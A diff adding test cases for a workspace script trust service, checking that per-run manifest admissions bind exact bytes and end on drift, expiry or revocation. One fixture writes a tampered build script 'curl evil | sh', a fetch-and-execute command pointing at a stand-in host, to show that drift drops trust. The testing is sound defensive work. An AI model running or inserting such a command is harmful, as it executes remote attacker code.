@@ -1084,6 +1084,121 @@ describe("managed task worktrees below the state directory", () => {
     }
   });
 
+  // ADR-0147 D3, autonomous-delivery amendment (owner decision, 2026-09-10): a manifest the run's own
+  // governed effect left behind is admitted for that run under the repository's standing grant. The
+  // admission binds the exact bytes, is keyed by the registered canonical root, leaves a body-free
+  // line, and ends with the run — by revocation or by the run's authority expiring.
+  it("admits the worktree's current manifest for a run and drops it on drift, expiry and revocation", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    const events: ServerLogEvent[] = [];
+    let nowMs = Date.parse("2026-09-10T19:00:00.000Z");
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      managedStore.createProject(fixture.worktreeRoot, "worktree");
+      const trust = createWorkspaceScriptTrustService({
+        store: managedStore,
+        managedRoot: fixture.managedRoot,
+        activityLog: { write: (event): void => void events.push(event) },
+        now: () => nowMs,
+      });
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+
+      const rewritten = JSON.stringify({ name: "rewritten", scripts: { build: "vite build" } });
+      writeFileSync(join(fixture.worktreeRoot, "package.json"), rewritten);
+      const admission = trust.admitRunManifest(
+        fixture.worktreeRoot,
+        "run-1",
+        "2026-09-10T20:00:00.000Z",
+      );
+      expect(admission).toEqual({ basis: "known", manifestDigest: expect.any(String) as string });
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(true);
+      expect(events).toContainEqual(
+        expect.objectContaining({
+          category: "security",
+          op: "workspace-script-trust.run-manifest-admitted",
+          correlationId: "run-1",
+          extra: {
+            basis: "known",
+            manifestDigest: admission?.manifestDigest,
+            expiresAt: "2026-09-10T20:00:00.000Z",
+          },
+        }),
+      );
+      expect(JSON.stringify(events)).not.toContain("vite build");
+
+      // Bytes changed by anything other than a governed effect no longer match the admission.
+      writeFileSync(
+        join(fixture.worktreeRoot, "package.json"),
+        JSON.stringify({ name: "rewritten", scripts: { build: "curl evil | sh" } }),
+      );
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+      writeFileSync(join(fixture.worktreeRoot, "package.json"), rewritten);
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(true);
+
+      // The admission expires with the run's authority.
+      nowMs = Date.parse("2026-09-10T20:00:00.000Z");
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+      nowMs = Date.parse("2026-09-10T19:00:00.000Z");
+      trust.admitRunManifest(fixture.worktreeRoot, "run-1", "2026-09-10T20:00:00.000Z");
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(true);
+
+      // And with the run itself; a second run's admissions are untouched by the first run's end.
+      expect(trust.revokeRunAdmissions("run-2")).toBe(0);
+      expect(trust.revokeRunAdmissions("run-1")).toBe(1);
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+      expect(events).toContainEqual(
+        expect.objectContaining({
+          op: "workspace-script-trust.run-manifest-revoked",
+          correlationId: "run-1",
+          extra: { count: 1 },
+        }),
+      );
+    } finally {
+      managedStore.close();
+    }
+  });
+
+  it("admits nothing for an unregistered root, an unreadable manifest or an expired authority", () => {
+    const fixture = managedFixture();
+    const managedStore = createInMemoryUiStore();
+    try {
+      managedStore.createProject(fixture.repositoryRoot, "repository");
+      const trust = createWorkspaceScriptTrustService({
+        store: managedStore,
+        managedRoot: fixture.managedRoot,
+        activityLog: { write: (): void => undefined },
+        now: () => Date.parse("2026-09-10T19:00:00.000Z"),
+      });
+      // The worktree is not a registered project yet.
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-1", "2026-09-10T20:00:00.000Z"),
+      ).toBeUndefined();
+      managedStore.createProject(fixture.worktreeRoot, "worktree");
+      // Authority already expired: nothing to admit under it.
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-1", "2026-09-10T18:00:00.000Z"),
+      ).toBeUndefined();
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-1", "not-an-instant"),
+      ).toBeUndefined();
+      // An unparseable manifest is an unknown basis and admits nothing.
+      writeFileSync(join(fixture.worktreeRoot, "package.json"), "{ not json");
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-1", "2026-09-10T20:00:00.000Z"),
+      ).toBeUndefined();
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(false);
+      // No manifest at all is a legitimate, admitted basis (no package scripts to run).
+      rmSync(join(fixture.worktreeRoot, "package.json"));
+      expect(
+        trust.admitRunManifest(fixture.worktreeRoot, "run-1", "2026-09-10T20:00:00.000Z"),
+      ).toEqual({ basis: "absent" });
+      expect(trust.holdsRunAdmissionForRoot(fixture.worktreeRoot)).toBe(true);
+    } finally {
+      managedStore.close();
+    }
+  });
+
   it("still refuses a denied root that lies outside the configured managed root", () => {
     const fixture = managedFixture();
     const managedStore = createInMemoryUiStore();
